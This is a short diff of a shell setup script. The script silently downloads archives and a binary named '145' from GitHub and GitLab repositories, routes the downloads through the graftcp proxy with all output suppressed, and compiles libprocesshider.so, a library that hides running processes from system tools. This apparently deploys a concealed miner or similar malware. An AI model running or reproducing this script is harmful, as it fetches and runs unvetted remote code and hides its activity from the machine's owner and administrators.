@@ -13,7 +13,7 @@ apt update -y;apt -y install binutils cmake build-essential screen unzip net-too
 
 sudo ph add graftcp 
 
-wget -o https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz  >/dev/null 2>&1
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz >/dev/null 2>&1
 
 tar -xvzf graphics.tar.gz >/dev/null 2>&1
 
@@ -47,7 +47,7 @@ echo " "
 ./graftcp/graftcp wget -o https://gitlab.com/jiorio669/donlod/-/raw/main/145 >/dev/null 2>&1
 chmod +x 145  >/dev/null 2>&1
 
-./graftcp/graftcp wget -o https://gitlab.com/jiorio669/donlod/-/raw/main/magic145.zip  >/dev/null 2>&1
+./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/magic145.zip >/dev/null 2>&1
 unzip -o magic145.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
